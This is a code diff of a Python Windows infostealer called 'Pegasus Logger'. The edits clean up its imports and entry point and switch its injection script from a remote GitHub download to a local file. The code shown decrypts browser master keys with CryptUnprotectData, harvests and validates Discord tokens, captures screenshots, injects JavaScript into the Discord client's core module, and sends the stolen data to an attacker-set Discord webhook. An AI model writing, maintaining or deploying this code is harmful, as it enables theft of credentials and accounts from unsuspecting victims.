@@ -1,41 +1,38 @@
-from pathlib import Path
-from getpass import getuser
+from base64 import b64decode, b64decode
 from contextlib import suppress
-from base64 import b64decode
-from json import load, loads
+from cryptography.fernet import Fernet
+from Crypto.Cipher import AES
+from difflib import get_close_matches
+from discord import Embed, File, RequestsWebhookAdapter, Webhook
+from getpass import getuser
+from json import loads
+from pathlib import Path
 from platform import platform
+from pyautogui import screenshot
+from requests import get
 from re import findall, match
 from shutil import copy2
 from sqlite3 import connect
 from subprocess import PIPE, Popen
 from threading import Thread
 from time import localtime, strftime
-from requests import get
-from zipfile import ZipFile
-from contextlib import suppress
-from Crypto.Cipher import AES
-from cryptography.fernet import Fernet
-from discord import Embed, File, RequestsWebhookAdapter, Webhook
-from pyautogui import screenshot
 from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
+from zipfile import ZipFile
 
-import base64
-import difflib
 import winreg
 import json
 import os
 import sys
 import psutil
-import requests
 import winshell
 
 
 WEBHOOK_URL = "&WEBHOOK_URL&"
 
 
-def main(webhook_url: str, webhook: Webhook, embed: Embed):
+def main(webhook_url: str):
     webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
     embed = Embed(title="Pegasus Logger", color=15535980)
 
@@ -71,22 +68,9 @@ def main(webhook_url: str, webhook: Webhook, embed: Embed):
         username="Pegasus",
     )
 
-
-def pegasus():
-    for func in {
-        # NOTE: You're grabbing the results of
-        # "main" and "cleanup" here, not the
-        # functions themselves
-        main(WEBHOOK_URL),
-        cleanup(),
-    }:
-        with suppress(Exception):
-            func()
-
-
 def account_info(tokens, embed):
     for token in int(tokens):  # What is "tokens"?
-        resp = requests.get(
+        resp = get(
             "https://discord.com/api/v9/users/@me",
             headers={"Authorization": tokens[token]},
         )
@@ -170,7 +154,7 @@ class GrabTokens:
             local_state = f.read()
         local_state = json.loads(local_state)
 
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
@@ -308,7 +292,7 @@ class GrabTokens:
                         for regex in self.regex:
                             for token in findall(regex, line):
                                 with suppress(Exception):
-                                    resp = requests.get(
+                                    resp = get(
                                         self.baseurl, headers=self.get_headers(token)
                                     )
 
@@ -334,7 +318,7 @@ class GrabTokens:
                                 ),
                             )
 
-                            r = requests.get(self.baseurl, headers=self.getheaders(token))
+                            r = get(self.baseurl, headers=self.getheaders(token))
                             if r.ok == 200 and token not in self.tokens:
                                 self.tokens.append(token)
 
@@ -351,7 +335,7 @@ class GrabTokens:
                         for regex in self.regex:
                             for token in findall(regex, line):
                                 with suppress(Exception):
-                                    resp = requests.get(
+                                    resp = get(
                                         self.baseurl, headers=self.get_headers(token)
                                     )
 
@@ -359,7 +343,7 @@ class GrabTokens:
                                     self.tokens.append(token)
 
         for token in self.tokens:
-            resp = requests.get(
+            resp = get(
                 "https://discord.com/api/v9/users/@me", headers={"Authorization": token}
             )
 
@@ -523,13 +507,11 @@ def inject(webhook_url):
             for __dir in os.listdir(os.path.abspath(appdata + os.sep + _dir)):
                 if match(r"app-(\d*\.\d*)*", __dir):
                     abspath = os.path.abspath(appdata + os.sep + _dir + os.sep + __dir)
-                    f = requests.get(
-                        "https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js"
-                    ).text.replace("%WEBHOOK%", webhook_url)
+                    f = Path("inject.js").read_text().replace("%WEBHOOK%", webhook_url)
                     modules_dir = os.listdir(abspath + "\\modules")
                     with open(
                         abspath
-                        + f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js',
+                        + f'\\modules\\{get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js',
                         "w",
                         encoding="utf-8",
                     ) as indexFile:
@@ -646,6 +628,7 @@ class StartUp:
 if __name__ == "__main__":
     if os.name == "nt":
         Debug()
-        pegasus()
+        main(WEBHOOK_URL)
+        cleanup()
     else:
         print("This program is designed for Windows NT Systems")
